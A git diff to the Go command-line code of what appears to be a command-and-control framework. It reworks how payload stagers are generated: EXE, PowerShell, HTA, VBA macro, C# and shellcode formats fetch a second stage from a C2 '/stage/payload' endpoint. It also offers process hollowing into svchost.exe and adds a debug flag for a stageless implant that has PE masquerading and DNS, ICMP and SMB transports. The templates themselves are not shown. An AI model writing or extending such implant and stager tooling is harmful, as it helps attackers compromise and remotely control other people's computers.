@@ -39,7 +39,7 @@ func init() {
 	stagerCmd.Flags().String("server", "http://127.0.0.1:8080", "C2 server URL")
 	stagerCmd.Flags().String("c2", "", "C2 server URL (alias for --server)")
 	stagerCmd.Flags().String("token", "", "Stage token (required — from 'stage upload')")
-	stagerCmd.Flags().String("key", "", "AES encryption key (must match server ENCRYPTION_KEY)")
+	stagerCmd.Flags().String("key", "", "AES encryption key — required for exe|hta|shellcode|dll; optional for ps1|ps1-mem|vba|cs")
 	stagerCmd.Flags().String("exec-method", "drop", "Execution method: drop|hollow|thread")
 	stagerCmd.Flags().String("hollow-exe", `C:\Windows\System32\svchost.exe`, "Hollow target process")
 	stagerCmd.Flags().String("format", "exe", "Output format: exe|ps1|ps1-mem|hta|vba|cs|shellcode|dll")
@@ -48,7 +48,9 @@ func init() {
 	stagerCmd.Flags().String("output", "", "Output file path (default: auto-named in current dir)")
 	stagerCmd.Flags().Bool("no-strip", false, "Keep debug symbols (larger binary)")
 	_ = stagerCmd.MarkFlagRequired("token")
-	_ = stagerCmd.MarkFlagRequired("key")
+	// --key is only required for formats that compile an EXE (exe, hta, shellcode, dll).
+	// Script-only formats (ps1, ps1-mem, vba, cs) validate at runtime so users are not
+	// forced to supply a key for pure-download delivery templates.
 }
 
 func runStager(cmd *cobra.Command, _ []string) error {
@@ -68,49 +70,77 @@ func runStager(cmd *cobra.Command, _ []string) error {
 	output, _ := cmd.Flags().GetString("output")
 	noStrip, _ := cmd.Flags().GetBool("no-strip")
 
-	// Always compile the EXE first
-	exePath, tmpDir, err := compileStager(compileOpts{
-		C2URL:     c2,
-		Token:     token,
-		Key:       key,
-		Method:    method,
-		HollowExe: hollowExe,
-		Arch:      arch,
-		Jitter:    fmt.Sprintf("%d", jitter),
-		Strip:     !noStrip,
-	})
-	if err != nil {
-		return fmt.Errorf("compile stager: %w", err)
-	}
-	if tmpDir != "" {
-		defer os.RemoveAll(tmpDir)
-	}
+	// Formats that require compiling a stager EXE.
+	needsEXE := map[string]bool{"exe": true, "hta": true, "shellcode": true}
 
-	exeBytes, err := os.ReadFile(exePath)
-	if err != nil {
-		return fmt.Errorf("read stager binary: %w", err)
+	// Validate --key early for formats that need it, with a clear message.
+	if needsEXE[format] && key == "" {
+		return fmt.Errorf("--key is required for format %q (it is optional only for ps1, ps1-mem, vba, cs)", format)
 	}
 
 	// Token travels in X-Stage-Token header — endpoint URL has no token in path.
 	stageEndpoint := strings.TrimRight(c2, "/") + "/stage/payload"
+
+	// compileEXE lazily compiles the stager EXE and caches the bytes.
+	// Called only by formats that actually embed or convert the binary.
+	var cachedExeBytes []byte
+	compileEXE := func() ([]byte, error) {
+		if cachedExeBytes != nil {
+			return cachedExeBytes, nil
+		}
+		exePath, tmpDir, err := compileStager(compileOpts{
+			C2URL:     c2,
+			Token:     token,
+			Key:       key,
+			Method:    method,
+			HollowExe: hollowExe,
+			Arch:      arch,
+			Jitter:    fmt.Sprintf("%d", jitter),
+			Strip:     !noStrip,
+		})
+		if err != nil {
+			return nil, fmt.Errorf("compile stager: %w", err)
+		}
+		if tmpDir != "" {
+			defer os.RemoveAll(tmpDir)
+		}
+		b, err := os.ReadFile(exePath)
+		if err != nil {
+			return nil, fmt.Errorf("read stager binary: %w", err)
+		}
+		cachedExeBytes = b
+		return b, nil
+	}
 
 	var data []byte
 	var ext string
 
 	switch format {
 	case "exe":
+		exeBytes, err := compileEXE()
+		if err != nil {
+			return err
+		}
 		data, ext = exeBytes, ".exe"
 	case "ps1":
 		data, ext = []byte(templatePS1Drop(stageEndpoint, token)), ".ps1"
 	case "ps1-mem":
 		data, ext = []byte(templatePS1Shellcode(stageEndpoint, token)), ".ps1"
 	case "hta":
+		exeBytes, err := compileEXE()
+		if err != nil {
+			return err
+		}
 		data, ext = []byte(templateHTA(stageEndpoint, token, exeBytes)), ".hta"
 	case "vba":
 		data, ext = []byte(templateVBA(stageEndpoint, token)), ".bas"
 	case "cs":
 		data, ext = []byte(templateCS(stageEndpoint, token)), ".cs"
 	case "shellcode":
+		exeBytes, err := compileEXE()
+		if err != nil {
+			return err
+		}
 		sc, err := pe2Shellcode(exeBytes)
 		if err != nil {
 			return fmt.Errorf("shellcode conversion: %w", err)
@@ -198,6 +228,7 @@ stagelessCmd.Flags().Int("interval", 30, "Beacon interval (seconds)")
 	stagelessCmd.Flags().String("masq-ver", "", "PE version string, e.g. 10.0.19041.1")
 	stagelessCmd.Flags().Bool("insecure-tls", false, "Skip TLS cert verification in agent (for self-signed C2 certs)")
 	stagelessCmd.Flags().String("cert-pin", "", "Pin server TLS leaf cert by SHA-256 hex fingerprint (HTTPS/WSS only)")
+	stagelessCmd.Flags().Bool("debug", false, "Debug build: skip pre-beacon delay, enable verbose output (lab use only)")
 	// ── Transport selection (Go implant only) ─────────────────────────────────
 	stagelessCmd.Flags().String("transport", "http", "Agent transport: http|https|ws|doh|dns|icmp|smb")
 	stagelessCmd.Flags().String("ws-url", "", "WebSocket URL (default: derived from --c2 with ws/wss scheme)")
@@ -241,6 +272,7 @@ func runStageless(cmd *cobra.Command, _ []string) error {
 	masqVer, _ := cmd.Flags().GetString("masq-ver")
 	insecureTLS, _ := cmd.Flags().GetBool("insecure-tls")
 	certPin, _ := cmd.Flags().GetString("cert-pin")
+	debugBuild, _ := cmd.Flags().GetBool("debug")
 	// Transport flags (Go implant only — C implant ignores these for now)
 	transport, _ := cmd.Flags().GetString("transport")
 	wsURL, _ := cmd.Flags().GetString("ws-url")
@@ -422,10 +454,11 @@ func runStageless(cmd *cobra.Command, _ []string) error {
 		Format:       FormatEXE,
 		OutputDir:    outDir,
 		OutputName:   outName,
-		StripSyms:    true,
-		NoGUI:        noGUI,
+		StripSyms:    !debugBuild,
+		NoGUI:        noGUI && !debugBuild,
 		Compress:     compress,
 		Profile:      profile,
+		Debug:        debugBuild,
 		InsecureTLS:  insecureTLS,
 		CertPin:      certPin,
 		Transport:    transport,
